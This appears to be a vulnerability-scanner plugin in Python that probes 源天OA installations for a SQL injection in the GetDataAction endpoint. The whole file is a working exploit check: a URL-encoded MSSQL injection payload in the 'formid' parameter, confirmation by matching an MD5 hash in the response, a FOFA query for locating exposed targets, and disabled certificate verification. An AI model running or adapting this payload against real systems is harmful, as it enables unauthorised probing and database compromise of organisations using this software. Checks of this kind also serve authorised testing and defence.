#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  ['https://peiqi.wgpsec.org/wiki/oa/源天OA/源天OA GetDataAction SQL注入漏洞.html','https://mp.weixin.qq.com/s/FgyvNdmAIF1KRR8FVyQMew'],

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '源天OA GetDataAction SQL注入',

      'level'     :   'high',

      'FOFA'      :   'body="/vmain/login.jsp"',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/ServiceAction/ServiceAction/com.velcro.base.GetDataAction?action=checkname&formid=-1%27%20OR%207063%20IN%20(SELECT%20(sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271%27))))%20AND%20%27a%27=%27a'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,allow_redirects=False,timeout=5,verify=False)
    if res.status_code == 500 and '0xc4ca4238a0b923820dcc509a6f75849b' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret